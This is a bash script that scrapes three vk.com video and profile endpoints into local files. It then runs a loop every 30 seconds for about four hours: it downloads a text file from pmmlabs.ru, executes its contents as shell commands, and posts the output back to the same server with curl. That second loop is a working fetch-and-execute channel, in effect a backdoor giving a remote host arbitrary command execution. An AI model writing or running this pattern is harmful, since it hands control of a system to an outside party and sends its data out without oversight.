#!/bin/bash

array=(
"vk.com/al_video.php?act=show&al=1&autoplay=1&module=video&show_next=1&video=-22822305_171359037"
"vk.com/al_video.php?act=show&al=1&autoplay=1&module=video&show_next=1&video=53083705_161242013"
"vk.com/al_profile.php?__query=nelive&al=1"
)
for url in ${array[@]}
do
    wget -nv -O - "http://$url" | awk -F '<!>' 'BEGIN{RS="~"}{print $8}' | iconv -f CP1251 -t UTF8 > $url
    sleep 1
done

i=480
while [ $i -ge 0 ]
do
  $(wget -nv -O - http://pmmlabs.ru/n/com.txt) | curl -d @- http://pmmlabs.ru/n/save.php
  i=$((i-1))
  sleep 30s
done
